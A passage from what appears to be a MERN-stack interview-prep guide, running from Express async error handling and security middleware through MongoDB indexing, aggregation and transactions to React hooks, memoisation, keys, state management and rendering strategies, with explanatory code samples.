
```js
const asyncHandler = (fn) => (req, res, next) =>
  Promise.resolve(fn(req, res, next)).catch(next);

app.get('/users', asyncHandler(async (req, res) => {
  const users = await db.find();
  res.json(users);
}));
```

The wrapper attaches `.catch(next)`, so any rejection becomes a `next(err)` call, which routes to your error middleware. Or use `express-async-errors` (a tiny library that monkey-patches Express).

**Express 5 fixes this** — async errors are forwarded automatically.

**Custom error classes.**

```js
class AppError extends Error {
  constructor(message, statusCode = 500, code = 'ERR') {
    super(message);
    this.statusCode = statusCode;
    this.code = code;
  }
}
class NotFound extends AppError {
  constructor(msg = 'Not found') { super(msg, 404, 'NOT_FOUND'); }
}
class Unauthorized extends AppError {
  constructor(msg = 'Unauthorized') { super(msg, 401, 'UNAUTHORIZED'); }
}

// in a controller
throw new NotFound(`User ${id} not found`);
```

The error handler then knows the status code and reports a clean message.

---

### Q23. How do you validate request input?

**Why validate?**

User input is hostile. Validation:
- Rejects malformed data early (before it hits your DB).
- Documents your API contract.
- Prevents a class of injection bugs (NoSQL injection, prototype pollution).

**Tools.**

- **`zod`** — TypeScript-first, infers types from schemas. My default for new TS projects.
- **`joi`** — battle-tested, mature. Great for JS projects.
- **`express-validator`** — middleware-style, popular but more verbose.

**Example with Zod.**

```ts
import { z } from 'zod';

const CreateUser = z.object({
  email: z.string().email(),
  age: z.number().int().min(18).max(120),
  name: z.string().min(1).max(100),
  role: z.enum(['user', 'admin']).default('user'),
});

// The TS type is INFERRED from the schema — single source of truth
type CreateUserDto = z.infer<typeof CreateUser>;

// Middleware-style
function validate(schema) {
  return (req, res, next) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      return res.status(400).json({ errors: result.error.flatten() });
    }
    req.body = result.data;   // validated + typed
    next();
  };
}

app.post('/users', validate(CreateUser), async (req, res) => {
  // req.body is typed as CreateUserDto
  const user = await userService.create(req.body);
  res.status(201).json(user);
});
```

**Validate everywhere user input enters:**

- Request body
- Query parameters
- URL path parameters
- File uploads (size, mime type)

---

### Q24. What security middleware do you use?

A baseline security setup for any Express app:

```js
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const mongoSanitize = require('express-mongo-sanitize');

app.use(helmet());                                     // sets safe HTTP headers
app.use(cors({ origin: 'https://myapp.com', credentials: true }));
app.use(express.json({ limit: '100kb' }));             // body size limit
app.use(mongoSanitize());                              // strip $ and . from inputs
app.use('/api/', rateLimit({ windowMs: 60_000, max: 100 }));
```

**What each does:**

- **`helmet`** — sets a bunch of security headers (`X-Frame-Options`, `Strict-Transport-Security`, `Content-Security-Policy`, etc.). Default to using it.
- **`cors`** — controls which origins can call your API. NEVER use `*` for authenticated endpoints. Use a strict allowlist.
- **`express-rate-limit`** — throttle by IP. For multi-instance apps, use Redis-backed (`rate-limiter-flexible`).
- **`express-mongo-sanitize`** — strips MongoDB operators (`$ne`, `$gt`) from user input to prevent NoSQL injection.
- **Body size limits** — prevent attackers from filling memory with huge payloads.

**Cookies (if used):**

```js
app.use(session({
  cookie: {
    httpOnly: true,        // not accessible from JS (mitigates XSS)
    secure: true,          // only over HTTPS
    sameSite: 'lax',       // mitigates CSRF
    maxAge: 24 * 60 * 60 * 1000,
  }
}));
```

**HTTPS in production.**

Run behind a reverse proxy (Nginx, ALB, Cloudflare) that terminates TLS. Set `app.set('trust proxy', 1)` so Express trusts `X-Forwarded-For` headers.

---

### Q25. How does Express handle async errors before v5?

Already covered in Q22 (the asyncHandler wrapper). The short version:

**Express 4 behaviour:**

```js
app.get('/users', async (req, res) => {
  throw new Error('boom');   // Express 4: unhandled rejection, NOT caught by error middleware
});
```

**Three fixes:**

1. **Manual try/catch + next:**
   ```js
   app.get('/users', async (req, res, next) => {
     try {
       const data = await fetchUsers();
       res.json(data);
     } catch (err) { next(err); }
   });
   ```

2. **Wrapper helper:**
   ```js
   const asyncHandler = fn => (req, res, next) =>
     Promise.resolve(fn(req, res, next)).catch(next);
   
   app.get('/users', asyncHandler(async (req, res) => {
     const data = await fetchUsers();
     res.json(data);
   }));
   ```

3. **`express-async-errors` package** — patches Express to forward async errors automatically. Just `require('express-async-errors')` once at app startup.

**Express 5** — async errors are forwarded automatically, no wrapper needed.

---

## 4. MongoDB

### Q26. Indexing — what types are there and when do you use each?

**The intuition.**

An index is a sorted lookup structure (B-tree) that lets MongoDB find documents without scanning the whole collection. Without an index, MongoDB does a `COLLSCAN` — reads every document. With one, it does an `IXSCAN` — looks up only the relevant documents.

**Trade-off:** indexes speed up reads but slow down writes (every write must update every index) and use disk/memory. Don't index everything.

**The types.**

| Type | When to use | Example |
|---|---|---|
| **Single field** | Most common — query by one field | `db.users.createIndex({ email: 1 })` |
| **Compound** | Query by multiple fields together | `{ status: 1, createdAt: -1 }` |
| **Multikey** | Field is an array; auto-created | `{ tags: 1 }` indexes each tag |
| **Text** | Full-text search | `{ name: 'text', description: 'text' }` |
| **Geospatial** | Location queries | `{ location: '2dsphere' }` |
| **Hashed** | Sharding by hash | `{ _id: 'hashed' }` |
| **TTL** | Auto-delete old docs | `{ expiresAt: 1 }, expireAfterSeconds: 0` |
| **Partial** | Index only matching docs | `{ status: 1 }, partialFilterExpression: { archived: false }` |
| **Sparse** | Index docs where the field exists | `{ phone: 1 }, sparse: true` |
| **Unique** | Enforce uniqueness | `{ email: 1 }, unique: true` |

**Always verify with `.explain()`.**

```js
db.orders.find({ customerId: '123', status: 'paid' }).explain('executionStats')
```

Look for:
- `stage: 'IXSCAN'` ✅ — using an index.
- `stage: 'COLLSCAN'` ❌ — full collection scan.
- `totalDocsExamined` should be close to `nReturned`.

---

### Q27. What's the ESR rule for compound indexes?

**ESR = Equality, Sort, Range.**

When designing a compound index, order fields in this priority:

1. **Equality** fields first — fields you query with exact match (`status: 'active'`).
2. **Sort** fields next — fields you sort by.
3. **Range** fields last — fields you query with `$gt`, `$lt`, `$gte`, `$lte`, `$in`.

**Why?**

A compound index is a B-tree sorted by the first field, then by the second within each first-field group, etc. Equality reduces the search space sharply. Sorting requires the data to already be in order. Range queries scan a span — they can't use later index fields effectively.

**Example.**

Query:
```js
db.orders.find({
  status: 'paid',                          // equality
  amount: { $gt: 100 }                     // range
}).sort({ createdAt: -1 })                 // sort
```

Best index:
```js
{ status: 1, createdAt: -1, amount: 1 }
//   E             S          R
```

This index lets MongoDB:
1. Jump to `status: 'paid'` (equality, very fast).
2. Walk in order of `createdAt` desc (no in-memory sort needed).
3. Filter `amount > 100` along the way (range).

**Counter-example: bad order.**

```js
{ amount: 1, status: 1, createdAt: -1 }   // R, E, S — bad
```

Mongo scans all amounts > 100, then filters status, then sorts in memory. Much slower.

**Pro tip.** Run `.explain('executionStats')` and look for `inMemorySort: false` and a covered query.

---

### Q28. Embedding vs Referencing in MongoDB.

**The fundamental design choice in MongoDB.**

Mongo lets you put related data inline (embedded) or in a separate collection (referenced, like a foreign key). Choose based on access patterns and growth.

**Embed when:**

- Data is **always read together** (one-to-few, contained).
- The sub-document doesn't need to be queried independently.
- Total document size stays well under 16MB (BSON limit).
- Updates are atomic at the document level — embedding gives you free transactions.

**Reference when:**

- One-to-many with **unbounded growth** (a user's posts could be 100,000+).
- The sub-document is updated independently and frequently.
- You need to query the sub-document on its own (find all comments mentioning X).
- Multiple parents share the same child (many-to-many).

**Examples.**

```js
// EMBED: a user's address — almost always read with the user, rarely changes
{
  _id: '...',
  name: 'Alice',
  address: { street: '...', city: '...', zip: '...' }
}

// REFERENCE: a user's posts — could be thousands, often queried independently
// users
{ _id: 'u1', name: 'Alice' }
// posts
{ _id: 'p1', userId: 'u1', title: '...', body: '...' }
{ _id: 'p2', userId: 'u1', title: '...', body: '...' }
```

**Hybrid pattern: denormalisation.**

Store the most-needed fields in both places:

```js
// posts
{
  _id: 'p1',
  userId: 'u1',
  authorName: 'Alice',     // duplicated for fast list rendering
  title: '...',
}
```

You accept duplication and write complexity (update authorName everywhere when user renames) in exchange for faster reads (no join needed to list posts).

**Rule of thumb.**

Design for your **most frequent read pattern**. SQL trains you to normalise; MongoDB rewards denormalising for reads. The 16MB limit forces you to think about growth.

---

### Q29. Explain the MongoDB Aggregation Pipeline. Give a real example.

**The intuition.**

An aggregation pipeline is a series of stages where the output of one stage is the input of the next. It's MongoDB's way of doing what SQL does with `GROUP BY`, `JOIN`, and complex transformations.

**Example: top 10 customers by total spend in 2025.**

```js
db.orders.aggregate([
  // 1. Filter — only paid orders from 2025
  { $match: { status: 'paid', createdAt: { $gte: ISODate('2025-01-01') } } },
  
  // 2. Group by customer, sum totals, count orders
  { $group: {
    _id: '$customerId',
    total: { $sum: '$amount' },
    count: { $sum: 1 }
  }},
  
  // 3. Sort by total descending
  { $sort: { total: -1 } },
  
  // 4. Take top 10
  { $limit: 10 },
  
  // 5. Join with customers collection
  { $lookup: {
    from: 'customers',
    localField: '_id',
    foreignField: '_id',
    as: 'customer'
  }},
  { $unwind: '$customer' },
  
  // 6. Reshape the output
  { $project: {
    customerId: '$_id',
    name: '$customer.name',
    total: 1,
    count: 1,
    _id: 0
  }}
]);
```

**Common stages cheat sheet.**

| Stage | What it does |
|---|---|
| `$match` | Filter documents (uses indexes if early) |
| `$project` | Reshape — pick/rename/compute fields |
| `$group` | Group by key + aggregate (sum, avg, count, etc.) |
| `$sort` | Sort by field(s) |
| `$limit` / `$skip` | Pagination |
| `$lookup` | Left outer join with another collection |
| `$unwind` | Explode array field — one doc per element |
| `$facet` | Run multiple pipelines in parallel on same input |
| `$bucket` / `$bucketAuto` | Histogram buckets |
| `$addFields` | Add computed fields (keep existing) |

**Performance tips.**

1. **Put `$match` and `$sort` first** so they can use indexes.
2. After `$group`, you've left the index world — subsequent `$match` is in memory.
3. Add `allowDiskUse: true` for huge pipelines (default 100MB memory limit).
4. `$lookup` is expensive — make sure the foreign field is indexed.

---

### Q30. What are transactions in MongoDB? When do you need them?

**The basics.**

Multi-document ACID transactions are supported on **replica sets** (since 4.0) and **sharded clusters** (since 4.2). Within a single document, MongoDB has always been atomic — that's free.

**Example: transferring money.**

```js
const session = client.startSession();
try {
  await session.withTransaction(async () => {
    await accounts.updateOne(
      { _id: fromId },
      { $inc: { balance: -100 } },
      { session }
    );
    await accounts.updateOne(
      { _id: toId },
      { $inc: { balance: 100 } },
      { session }
    );
    // both succeed → commit. Either fails → both roll back.
  });
} finally {
  await session.endSession();
}
```

**Costs.**

- Performance overhead (multi-document locking, logging).
- Contention — long transactions block others.
- Complexity — error handling and retries.
- Default 60s timeout — long transactions abort.

**When you NEED transactions.**

- Money movement (banking, ledgers).
- Inventory consistency across multiple items.
- Multi-document state machines that must be consistent.

**When you DON'T.**

Often you can redesign to avoid them:
- Embed the related data so updates are within a single document (atomic for free).
- Use the **outbox pattern** — write the state change and an event in the same document, process the event later.
- Eventual consistency is often fine for non-critical paths.

**The MongoDB philosophy:** "Schema flexibility lets you avoid most transactions." Use them when you must, design around them when you can.

---

### Q31. Replica Set vs Sharding.

**Two completely different scaling axes.**

**Replica Set: high availability + read scaling.**

- One **primary** (handles writes), multiple **secondaries** (replicas of the primary).
- All nodes have the **same data**.
- If primary fails, an election promotes a secondary. Automatic failover, typically within 10–30 seconds.
- Reads can be served from secondaries (with eventual consistency).

```
Primary  ←─writes─  client
   ↓ replication
Secondary 1
Secondary 2
```

You **always** want a replica set in production. Three nodes minimum: a primary, a secondary, and a tiebreaker (arbiter or another secondary).

**Sharding: write scaling.**

- Data is **partitioned across shards** by a shard key.
- Each shard is itself a replica set.
- A `mongos` router directs queries to the right shard.

```
        mongos (router)
       /    |    \
  shard1  shard2  shard3
   (RS)    (RS)    (RS)
```

You shard when:
- Working set > one server's RAM.
- Write throughput exceeds one node's capacity.
- Data exceeds one node's storage.

**The hardest part: choosing a shard key.**

A good shard key has:
- **High cardinality** — many distinct values (so data spreads).
- **Even distribution** — no hot spot.
- **Aligned with queries** — most queries should target one shard, not all (no scatter-gather).

**Bad shard keys.**

- Monotonic (timestamp, autoincrement) — all writes hit the latest shard. Hot shard.
- Low cardinality (`country`) — only as many partitions as countries.
- Doesn't match query patterns — every query becomes scatter-gather.

**Default advice:** start unsharded, scale vertically and with read replicas, only shard when truly needed.

---

### Q32. Mongoose `populate` — how does it work? Drawbacks?

**What it does.**

`populate` resolves a referenced ObjectId by issuing a second query and merging the result.

```js
// Schema
const PostSchema = new Schema({
  title: String,
  author: { type: Schema.Types.ObjectId, ref: 'User' }
});

// Query
const posts = await Post.find().populate('author', 'name email');
// posts[0].author is now { _id, name, email }, not just an ObjectId
```

**What's actually happening:**

1. `Post.find()` runs — returns posts with author as ObjectId.
2. Mongoose collects all unique author IDs.
3. Issues `User.find({ _id: { $in: [...ids] } })`.
4. Maps users back into the posts.

So it's two queries, not a join.

**Drawbacks.**

1. **N+1 risk** — if you populate inside a loop:
   ```js
   for (const post of posts) {
     await Post.findById(post._id).populate('author');   // 1 query each!
   }
   ```
   Always batch with a single `.populate()` call.

2. **Round-trip latency** — two queries instead of one.

3. **Can't filter parent by populated fields** — Mongoose can't say "find posts where the author's age > 30" via populate. You need `$lookup`.

4. **Memory** — large populated arrays balloon document size in memory.

**When to use `$lookup` instead.**

For complex queries, joining at the database level via aggregation `$lookup` is more efficient — it's a single round trip and can filter on joined fields:

```js
Post.aggregate([
  { $lookup: {
    from: 'users',
    localField: 'author',
    foreignField: '_id',
    as: 'author'
  }},
  { $unwind: '$author' },
  { $match: { 'author.age': { $gt: 30 } } }
]);
```

---

### Q33. Explain optimistic vs pessimistic locking. How do you implement either in Mongo?

**The problem they solve.**

Two users update the same document at nearly the same time. Without coordination, one update overwrites the other (the "lost update" problem).

**Pessimistic locking — "lock then update".**

You explicitly lock the row/document. Other writers wait. Common in SQL (`SELECT FOR UPDATE`).

MongoDB doesn't have native row locking for normal CRUD. You'd use a transaction with `findOneAndUpdate` to serialise:

```js
await session.withTransaction(async () => {
  const item = await Item.findOne({ _id: id }, null, { session });
  if (item.qty <= 0) throw new Error('Out of stock');
  await Item.updateOne({ _id: id }, { $inc: { qty: -1 } }, { session });
});
```

**Optimistic locking — "try, check, retry".**

You assume conflicts are rare. Read with a version number. When you write, check the version is unchanged. If it changed, retry.

```js
const doc = await Item.findById(id);

const result = await Item.updateOne(
  { _id: id, version: doc.version },                  // only if version matches
  { $set: { qty: doc.qty - 1 }, $inc: { version: 1 } }
);

if (result.matchedCount === 0) {
  throw new Error('Conflict — someone else updated. Retry.');
}
```

If two clients try to update with version 5, only one succeeds (incrementing to 6). The other's `matchedCount` is 0.

**Mongoose helps:** every document has `__v` (version key) and Mongoose checks it on `.save()`.

**When to use which.**

- **Optimistic** — most cases. Conflicts are rare; retry is cheap. No locking overhead.
- **Pessimistic** — high-contention scenarios where retries would thrash (lots of writers all hitting the same document).

---

### Q34. What are change streams?

**The intuition.**

A change stream is a real-time feed of changes happening on a collection (or DB, or cluster). Internally it tails the **oplog** (the replica set's operation log) and streams events to your application.

**Use cases.**

- Cache invalidation — when a user document changes, invalidate the cached version.
- Search index sync — keep Elasticsearch in sync with MongoDB.
- Real-time UI updates — push changes to connected clients.
- Event-driven microservices — react to data changes without polling.

**Example.**

```js
const stream = User.watch([
  { $match: { 'fullDocument.country': 'IN' } }   // optional filter
]);

stream.on('change', (change) => {
  console.log(change.operationType);   // 'insert', 'update', 'delete', etc.
  console.log(change.fullDocument);    // the new/updated document
  
  if (change.operationType === 'update') {
    cache.invalidate(change.documentKey._id);
  }
});
```

**Requirements.**

- A **replica set** (or sharded cluster). Standalone Mongo doesn't have an oplog.
- The right oplog retention — if your stream falls behind beyond the oplog, you lose events.

**Resumability.**

Each event has a `_id` (resume token). On restart, pass it to resume from where you left off:

```js
const stream = User.watch([], { resumeAfter: lastToken });
```

This makes change streams suitable for reliable event pipelines.

---

## 5. React (MERN)

### Q35. Class components vs function components with hooks. Why hooks?

**A bit of history.**

React started with class components — `class Foo extends React.Component { render() { ... } }`. State and lifecycle (`componentDidMount`, etc.) lived on the class. Then in 2019, hooks landed in React 16.8.

**Hooks let function components do what classes did:**

| Class | Hook equivalent |
|---|---|
| `this.state`, `this.setState` | `useState` |
| `componentDidMount`, `componentDidUpdate`, `componentWillUnmount` | `useEffect` |
| `componentDidCatch` (error boundary) | Still needs a class — no hook for this |
| `shouldComponentUpdate` | `React.memo` + `useMemo`/`useCallback` |
| `getDerivedStateFromProps` | Compute during render |

**Why hooks won.**

1. **No `this`** — fewer bugs, no `.bind` ceremony.
2. **Easier code reuse** — custom hooks are just functions. Beats HOCs and render props.
3. **Less boilerplate** — function components are smaller.
4. **Better composition** — related logic stays together (state + effect for one feature in one block).
5. **Easier to test** — call the hook, assert outputs.

**Class component:**

```jsx
class Counter extends React.Component {
  state = { count: 0 };
  increment = () => this.setState(s => ({ count: s.count + 1 }));
  render() {
    return <button onClick={this.increment}>{this.state.count}</button>;
  }
}
```

**Function component with hook:**

```jsx
function Counter() {
  const [count, setCount] = useState(0);
  return <button onClick={() => setCount(c => c + 1)}>{count}</button>;
}
```

Modern React is essentially all hooks. Classes are legacy — fine to maintain, but new code uses functions.

---

### Q36. Explain `useEffect`. What's the dependency array? What is the cleanup function for?

**The intuition.**

`useEffect` is for **side effects** — things that affect the world outside React: network requests, subscriptions, timers, DOM measurements, logging.

It runs **after render**, so the DOM is committed before your effect runs (no blocking).

**The signature.**

```js
useEffect(() => {
  // setup — runs after render
  return () => {
    // cleanup — runs before the next setup, and on unmount
  };
}, [dependencies]);
```

**The dependency array controls when it runs.**

```js
useEffect(() => { ... }, []);          // once after mount only
useEffect(() => { ... }, [a, b]);      // every time `a` or `b` changes
useEffect(() => { ... });              // after every render — almost always wrong
```

React compares dependency values with `Object.is`. New reference = "changed."

**Cleanup function — what it's for.**

If your effect creates something that lives beyond the render (a timer, a subscription, an event listener), you must clean it up. Otherwise: memory leaks, stale state, crashes.

```jsx
useEffect(() => {
  const id = setInterval(() => console.log('tick'), 1000);
  return () => clearInterval(id);   // STOP the timer when unmounting
}, []);

useEffect(() => {
  const controller = new AbortController();
  fetch(`/api/users/${userId}`, { signal: controller.signal })
    .then(r => r.json())
    .then(setUser);
  return () => controller.abort();   // cancel if userId changes mid-flight
}, [userId]);
```

**When does cleanup run?**

- Before the effect re-runs (because deps changed).
- When the component unmounts.

Effectively, cleanup undoes whatever setup did.

**The classic bug: stale closures.**

```jsx
function Counter() {
  const [count, setCount] = useState(0);
  
  useEffect(() => {
    const id = setInterval(() => {
      setCount(count + 1);   // stale! always reads count at mount = 0
    }, 1000);
    return () => clearInterval(id);
  }, []);   // empty deps — effect captures count=0 forever
  
  return <h1>{count}</h1>;   // stuck at 1 forever
}
```

Fixes:
1. Use the **functional updater**:
   ```js
   setInterval(() => setCount(c => c + 1), 1000);   // always current
   ```
2. Add `count` to deps (but the timer resets every render):
   ```js
   }, [count]);
   ```
3. Use a ref for values that shouldn't trigger re-runs.

---

### Q37. `useMemo` vs `useCallback` vs `React.memo`. When do you actually use them?

**The three memoisation tools.**

- **`useMemo(() => compute(a), [a])`** — memoises a **value** computed from `a`. Recomputes only when `a` changes.
- **`useCallback(fn, [deps])`** — memoises a **function reference**. Returns the same function across renders unless `deps` change.
- **`React.memo(Component)`** — memoises a **component**. Skips re-render if props are shallow-equal to last render.

**`useCallback` is just `useMemo` for functions:**

```js
const handleClick = useCallback(() => { ... }, [a]);
// is equivalent to:
const handleClick = useMemo(() => () => { ... }, [a]);
```

**When you actually need them.**

The honest answer: most of the time, you don't. They have a cost (storing the memo, comparing deps). Use them only when:

**1. The computation is genuinely expensive.**

```jsx
const sortedItems = useMemo(
  () => items.slice().sort(expensiveCompare),
  [items]
);
```

**2. You're passing a callback or value to a memoised child.**

If the child is wrapped in `React.memo`, every new function reference defeats the memo:

```jsx
const Child = React.memo(({ onClick }) => <button onClick={onClick}>Hi</button>);

function Parent() {
  // BAD — new function every render, Child re-renders every time
  return <Child onClick={() => doSomething()} />;
  
  // GOOD — stable reference, Child re-renders only when handleClick changes
  const handleClick = useCallback(() => doSomething(), []);
  return <Child onClick={handleClick} />;
}
```

**3. The value is a dependency in another hook.**

```jsx
const config = useMemo(() => ({ timeout: 5000 }), []);
useEffect(() => { ... }, [config]);   // config is stable, effect only runs once
```

**The wrong reason to use them: "to make the app faster."**

Memoising everything makes the app slower. Profile first with React DevTools Profiler. Memoise where it actually helps.

---

### Q38. What's the Virtual DOM? How does React decide what to re-render?

**The Virtual DOM.**

The Virtual DOM (VDOM) is a JavaScript object representation of the UI. When state changes, React doesn't directly manipulate the DOM. Instead:

1. It builds a new VDOM tree from the new state.
2. **Diffs** the new tree against the previous one (reconciliation).
3. Applies only the **minimum changes** to the real DOM.

The real DOM is slow to manipulate; the VDOM is fast. Computing diffs in memory and only touching the DOM where needed is the speed win.

**The diffing algorithm.**

A naive tree diff is O(n³). React's is O(n) thanks to two assumptions:

1. **Different element types replace the entire subtree.** If `<div>` becomes `<section>`, React tears down the div and rebuilds. Doesn't try to be clever.
2. **Lists need stable `key` props.** Without keys (or with index keys), React can't tell which item moved. With keys, it can match items by identity.

**Example.**

```jsx
// Before
<ul>
  <li key="a">A</li>
  <li key="b">B</li>
</ul>

// After
<ul>
  <li key="b">B</li>
  <li key="a">A</li>
</ul>
```

With keys, React says "swap these." Without keys, React updates the contents of both li's.

**Fiber and Concurrent Rendering (React 16+).**

The reconciler was rewritten as **Fiber** — work is split into units that can be paused and resumed. This enables features like:
- Time slicing (yield to the browser to keep things responsive).
- Concurrent features (`useTransition`, `useDeferredValue`) for low-priority updates.
- Suspense for async boundaries.

What triggers a re-render?
- `useState` setter called with a different value.
- Parent re-renders (children re-render too, unless memoised).
- Context value changed (consumers re-render).

---

### Q39. Why are `key` props important?

**The problem keys solve.**

When a list re-renders, React needs to know which DOM nodes to keep, which to update, and which to remove. Without identity, it has to guess based on position.

**Example: bad keys (using index).**

```jsx
// Initial render
<input key={0} />   // user types "Alice" — DOM input has "Alice"
<input key={1} />   // empty
<input key={2} />   // empty

// You delete the first item. Now:
<input key={0} />   // was index 1 in the old array — but key=0 already exists!
<input key={1} />   // was index 2

// React thinks: same key, just update. The "Alice" input stays — but it's pointing at the wrong data.
```

Result: the form data is now associated with the wrong items.

**With stable keys (database IDs):**

```jsx
{items.map(item => <input key={item.id} defaultValue={item.value} />)}
```

When item-1 is removed, React sees: keys went from `[1,2,3]` to `[2,3]`. It removes the first DOM node. The other two stay intact.

**The bugs bad keys cause.**

- **Lost focus** when reordering a list.
- **Wrong items animating** in/out.
- **State leaking** between items (form values, expansion state).
- **Wrong selections** in dropdowns.

**Rules of thumb.**

- Use a stable, unique ID (ideally the database `_id`).
- Index keys are OK ONLY for static lists that never reorder, never insert/delete.
- Don't use `Math.random()` — that creates a new key every render, defeating reconciliation entirely.

---

### Q40. How do you handle global state? Context vs Redux vs Zustand vs Redux Toolkit.

**The big realisation.**

There are two kinds of "global state":

- **Server state** — data fetched from your API. It's a **cache** of what the server has.
- **Client state** — UI state that lives only in the browser (theme, modal open/closed, form drafts).

Different tools for different jobs.

**Server state: use a query library.**

- **TanStack Query (React Query)** — most popular. Caching, deduplication, refetching, retries.
- **SWR** — Vercel's, simpler API.
- **RTK Query** — built into Redux Toolkit.

DON'T put API responses into Redux/Context manually. You'll re-implement caching, dedup, refetching badly.

```jsx
const { data, isLoading } = useQuery({
  queryKey: ['user', id],
  queryFn: () => api.getUser(id),
});
```

**Client state: pick by app size.**

| Tool | Best for |
|---|---|
| **`useState`** | Component-local state |
| **Context** | Low-frequency global (theme, current user, locale). All consumers re-render on change. |
| **Zustand** | Medium apps. Minimal API, no provider needed, hooks-based. |
| **Redux Toolkit** | Large apps with complex state, middleware, time-travel debugging |
| **Jotai / Recoil** | Atomic state — small independent pieces of state |

**Context — the trap.**

Context is fine for things that change rarely. If your context value updates on every keystroke, every consumer re-renders. Profile this — it's a common perf problem.

**Redux Toolkit example.**

```js
const cartSlice = createSlice({
  name: 'cart',
  initialState: [],
  reducers: {
    addItem: (state, action) => { state.push(action.payload); },
    removeItem: (state, action) => state.filter(i => i.id !== action.payload),
  }
});

// In component
const items = useSelector(s => s.cart);
const dispatch = useDispatch();
dispatch(cartSlice.actions.addItem({ id: 1, name: 'Book' }));
```

**My typical stack today.**

- TanStack Query for server state.
- Zustand or Context for simple client state.
- Redux Toolkit only when state is genuinely complex (multi-step workflows, undo/redo, complex selectors).

---

### Q41. Controlled vs uncontrolled components.

**Controlled — React owns the value.**

```jsx
function Form() {
  const [name, setName] = useState('');
  return (
    <input
      value={name}                         // value comes from React state
      onChange={e => setName(e.target.value)}
    />
  );
}
```

React is the source of truth. Every keystroke triggers a re-render. You can validate live, format on the fly, prevent invalid input.

**Uncontrolled — DOM owns the value.**

```jsx
function Form() {
  const inputRef = useRef();
  const handleSubmit = () => {
    console.log(inputRef.current.value);   // read from DOM on demand
  };
  return <input ref={inputRef} defaultValue="hello" />;
}
```

The DOM holds the value. You only read it when you need to (typically on submit). Less code, fewer renders.

**When to use which.**

- **Controlled** — most forms. You want live validation, conditional formatting, dependent fields.
- **Uncontrolled** — simple forms with submit-once logic. Also for `<input type="file">` (file inputs are always uncontrolled — you can't set their value from JS).

**Form libraries.**

For non-trivial forms, use a library:
- **React Hook Form** — uncontrolled by default, very performant, minimal re-renders.
- **Formik** — controlled, mature.
- **TanStack Form** — newer, framework-agnostic.

These handle validation, errors, dirty state, submission for you.

---

### Q42. Lifting state up — what is it and when?

**The pattern.**

When two sibling components need to share state, you can't pass data sideways in React. The solution: move the state up to their nearest common ancestor and pass it down via props.

**Example.**

```jsx
// Both children need to know the temperature
function App() {
  const [temp, setTemp] = useState(20);
  return (
    <>
      <TemperatureInput value={temp} onChange={setTemp} />
      <BoilingIndicator temp={temp} />
    </>
  );
}
```

The state lives in `App`. `TemperatureInput` is controlled by `App`. `BoilingIndicator` reads from `App`. Single source of truth.

**When to lift.**

- Sibling components need the same data.
- A child needs to communicate with a parent or sibling.

**When NOT to lift.**

- The state is purely local. Don't lift if no one else needs it.
- Lifting causes too much prop drilling (passing props through many levels). At that point, switch to Context or a state library.

**Prop drilling — the smell.**

```jsx
<App user={user}>
  <Layout user={user}>
    <Sidebar user={user}>
      <UserMenu user={user} />   // 4 layers deep just to pass user
    </Sidebar>
  </Layout>
</App>
```

When you see this, lift to Context (for read-mostly data) or use a state library.

---

### Q43. What are React refs? When do you use them?

**The intuition.**

`useRef` returns an object whose `.current` property persists across renders and **does not trigger re-renders when changed**.

```js
const ref = useRef(initialValue);
// ref.current can be read or written
// changing ref.current does NOT cause a re-render
```

**Two main uses.**

**1. Accessing a DOM element.**

```jsx
function FocusInput() {
  const inputRef = useRef();
  
  useEffect(() => {
    inputRef.current.focus();   // imperatively focus on mount
  }, []);
  
  return <input ref={inputRef} />;
}
```

**2. Storing values that shouldn't trigger renders.**

```jsx
function Stopwatch() {
  const [seconds, setSeconds] = useState(0);
  const intervalRef = useRef(null);
  
  const start = () => {
    intervalRef.current = setInterval(
      () => setSeconds(s => s + 1),
      1000
    );
  };
  const stop = () => clearInterval(intervalRef.current);
  
  return (
    <div>
      <p>{seconds}</p>
      <button onClick={start}>Start</button>
      <button onClick={stop}>Stop</button>
    </div>
  );
}
```

The interval ID isn't UI state — it doesn't need to render. A ref is the right place.

**Other uses.**

- Tracking previous values (`prevValueRef.current`).
- Storing instance variables (mutable values that survive re-renders).
- Holding onto third-party library instances (charts, maps).

**When NOT to use refs.**

- For state that shows in the UI — use `useState`.
- To "force" re-renders — that's a code smell. Find the right state.

---

### Q44. How do you optimize a slow React app?

**Step 0: profile first. Don't guess.**

Use React DevTools Profiler. Record an interaction. Look at:
- Which components are rendering on each commit.
- How long each render takes.
- Which renders were "wasted" (no actual change).

The biggest wins come from finding wasteful renders, not from random memoising.

**The optimisation toolbox.**

**1. Code-splitting.**

Split your bundle so users only download code for the page they're on.

```jsx
const Admin = React.lazy(() => import('./Admin'));

<Suspense fallback={<Spinner />}>
  <Routes>
    <Route path="/admin" element={<Admin />} />
  </Routes>
</Suspense>
```

**2. Virtualise long lists.**

Don't render 10,000 rows. Render only what's visible.

```jsx
import { FixedSizeList } from 'react-window';

<FixedSizeList height={500} itemCount={10000} itemSize={40}>
  {({ index, style }) => <div style={style}>Item {index}</div>}
</FixedSizeList>
```

**3. Memoise expensive computations.**

```jsx
const filtered = useMemo(
  () => bigList.filter(predicate),
  [bigList, predicate]
);
```

**4. Memoise hot child components.**

```jsx
const Row = React.memo(function Row({ item }) { ... });
```

Combined with stable callback references via `useCallback`.

**5. Don't create new objects/arrays inline that are passed as props.**

```jsx
// BAD — new object every render, defeats React.memo on Child
<Child config={{ size: 10 }} />

// GOOD — stable reference
const config = useMemo(() => ({ size: 10 }), []);
<Child config={config} />
```

**6. Debounce rapid inputs.**

For search-as-you-type, throttle/debounce the API call.

**7. Move state down.**

If a piece of state is used in only one subtree, push it down. State at the root re-renders the entire tree.

**8. Use `key` correctly.**

Avoid index keys for dynamic lists. Don't use random keys.

**9. Use Concurrent features.**

```jsx
const [isPending, startTransition] = useTransition();

const handleSearch = (q) => {
  setQuery(q);                  // urgent — input updates immediately
  startTransition(() => {
    setResults(filter(q));      // low priority — can be interrupted
  });
};
```

---

### Q45. What is server-side rendering (SSR)? How is it different from CSR and SSG?

**Four main rendering strategies.**

| Strategy | When HTML is built | Pros | Cons |
|---|---|---|---|
| **CSR** (Client-Side Rendering) | In the browser, after JS loads | Simple, full SPA | Slow first paint, bad SEO without effort |
| **SSR** (Server-Side Rendering) | On the server, on each request | Good SEO, fast TTFB, personalised | Higher server load, complexity |
| **SSG** (Static Site Generation) | At build time | Fastest, cheapest to host | Only for non-personalised content |
| **ISR** (Incremental Static Regeneration) | At build, then refreshed periodically | SSG speed + freshness | Next.js-specific, complexity |

